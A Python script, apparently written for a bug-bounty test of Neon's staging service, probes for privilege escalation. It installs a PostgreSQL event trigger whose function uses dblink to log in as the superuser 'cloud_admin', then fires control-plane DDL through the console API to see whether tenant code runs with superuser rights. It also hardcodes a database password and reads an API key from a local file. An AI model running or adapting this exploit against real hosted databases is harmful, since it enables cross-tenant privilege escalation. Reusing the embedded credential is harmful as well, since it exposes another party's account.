# -*- coding: utf-8 -*-
"""事件触发器载体实验(零破坏观察):
1) neondb 库持久化 k_evt_log 日志表 + 事件触发器(函数内 dblink 尝试写日志,异常吞掉)
   - 若触发者为 cloud_admin: dblink(superuser 豁免)可用 -> 日志行出现
   - 若触发者为租户自己: dblink 被 Neon patch 拒 -> 无日志(但 RAISE 可区分)
2) console API 触发 CREATE ROLE(控制面 DDL) -> 观察日志表
3) 完成后清理触发器/函数/表(保留证据截图后删)
"""
import psycopg, json, urllib.request, time

PWD = 'npg_cI5ynlaAqjU2'
HOST = 'ep-crimson-fog-w2gucld1.us-east-2.aws.neon.build'
URI = 'postgresql://neondb_owner:%s@%s/neondb' % (PWD, HOST)
conn = psycopg.connect(URI, connect_timeout=20)
conn.autocommit = True
cur = conn.cursor()

def q(sql):
    try:
        cur.execute(sql)
        try:
            return cur.fetchall()
        except Exception:
            return 'OK'
    except Exception as e:
        return 'ERR: %s' % str(e)[:250]

# ---- API 凭据 ----
cfg = json.load(open(r'D:\scan\neon_report\_apikey.json'))
API_HOST = 'console-stage.neon.build'
API_BASE = '/api/v2'
KEY = cfg.get('key') or cfg.get('api_key') or ''
PROJ = 'orange-sun-90493739'

def api(path, method='GET', body=None):
    url = 'https://%s%s%s' % (API_HOST, API_BASE, path)
    req = urllib.request.Request(url, method=method)
    req.add_header('Authorization', 'Bearer %s' % KEY)
    req.add_header('X-Bug-Bounty', 'xxbo')
    req.add_header('Content-Type', 'application/json')
    req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36')
    req.add_header('Accept', 'application/json')
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=25) as r:
            return r.status, json.loads(r.read().decode())
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:500]
    except Exception as e:
        return 0, str(e)[:300]

print('=== [1] 建日志表 + dblink + 事件触发器函数 ===')
print('log table:', q('CREATE TABLE IF NOT EXISTS public.k_evt_log(t timestamptz DEFAULT now(), who text, tag text, note text)'))
print('dblink ext:', q('CREATE EXTENSION IF NOT EXISTS dblink'))
print('fn:', q("""CREATE OR REPLACE FUNCTION public.k_evt_probe() RETURNS event_trigger AS $$
BEGIN
    BEGIN
        PERFORM dblink_connect('k', 'host=127.0.0.1 port=5432 user=cloud_admin password=x dbname=neondb connect_timeout=3');
        PERFORM dblink_exec('k', 'INSERT INTO public.k_evt_log(who, tag, note) SELECT current_user, ''x'', ''evt-dblink''');
        PERFORM dblink_disconnect('k');
    EXCEPTION WHEN OTHERS THEN
        RAISE WARNING 'K_EVT dblink-fail (非 superuser 上下文或 patch 拦): %', SQLERRM;
    END;
END
$$ LANGUAGE plpgsql"""))
print('evt trigger:', q("DROP EVENT TRIGGER IF EXISTS k_evt_probe_trg"))
print(q("""CREATE EVENT TRIGGER k_evt_probe_trg ON ddl_command_end EXECUTE FUNCTION public.k_evt_probe()"""))
print('existing:', q("SELECT evtname FROM pg_event_trigger"))

print('\n=== [2] 先自触发一次(建个 k_ 表, 应看到租户身份: dblink denied) ===')
print(q('CREATE TABLE k_self_ddl(x int)'))
print('log after self-DDL:', q('SELECT * FROM public.k_evt_log'))
print(q('DROP TABLE IF EXISTS k_self_ddl'))

print('\n=== [3] console API 触发 CREATE ROLE(控制面 DDL) ===')
# 先列 branches 找到可用 branch
st, br = api('/projects/%s/branches' % PROJ)
print('branches status:', st)
if st == 200 and br and br.get('branches'):
    bid = br['branches'][0]['id']
    print('using branch:', bid)
    import random
    rname = 'k_evt_role_%d' % random.randint(100000, 999999)
    st2, r2 = api('/projects/%s/branches/%s/roles' % (PROJ, bid), 'POST', {'role': {'name': rname}})
    print('create role status:', st2, str(r2)[:300])
    time.sleep(3)
    print('log after console DDL:', q('SELECT * FROM public.k_evt_log'))
    # 清理:删角色(若创建成功)
    if st2 == 201 or (isinstance(r2, dict) and r2.get('role')):
        rid = r2.get('role', {}).get('id') or r2.get('role', {}).get('name')
        st3, r3 = api('/projects/%s/branches/%s/roles/%s' % (PROJ, bid, rid), 'DELETE')
        print('cleanup role status:', st3, str(r3)[:200])
else:
    print('no branches:', str(br)[:300])

print('\n=== [4] 观察结果 ===')
print(q('SELECT * FROM public.k_evt_log ORDER BY t'))

conn.close()
